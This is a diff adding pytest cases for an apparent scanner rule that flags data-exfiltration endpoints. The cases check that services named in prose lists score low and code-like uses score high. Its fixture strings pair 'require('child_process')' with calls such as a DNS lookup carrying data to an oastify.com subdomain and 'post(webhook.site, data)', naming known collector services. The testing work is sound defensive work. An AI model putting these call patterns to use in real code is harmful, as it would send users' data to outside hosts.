@@ -958,3 +958,32 @@ def test_a_tunnel_suffix_in_a_host_check_is_low(text: str) -> None:
 )
 def test_a_tunnel_suffix_outside_a_host_check_stays_high(text: str) -> None:
     assert ("high", 5.0) in _exfil(text)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "description: 'Short-lived collectors (webhook.site, requestbin, ngrok, interact.sh) or"
+        " raw IP endpoints are classic', cp = require('child_process')",
+        "  request catcher (webhook.site, interact.sh) or a Discord/Slack webhook. These are",
+    ],
+)
+def test_a_service_named_in_a_prose_list_is_low(text: str) -> None:
+    """v10 (P2): a bare service name in a parenthesised list after a word."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert matches
+    assert {(m.severity.value, m.weight) for m in matches} == {("low", 1.0)}
+    assert all("prose" in m.explanation for m in matches)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "require('child_process'); dns.lookup(`${d}.x1y2z3.oastify.com`, cb) // (oastify, x)",
+        "require('child_process'); post(webhook.site, data)",
+        "require('child_process'); hosts (abcd1234.oast.fun, interact.sh)",  # an id
+        f"require('child_process'); see (https://webhook.site/{_UUID}, x)",
+    ],
+)
+def test_a_service_outside_a_prose_list_stays_high(text: str) -> None:
+    assert ("high", 5.0) in _exfil(text)
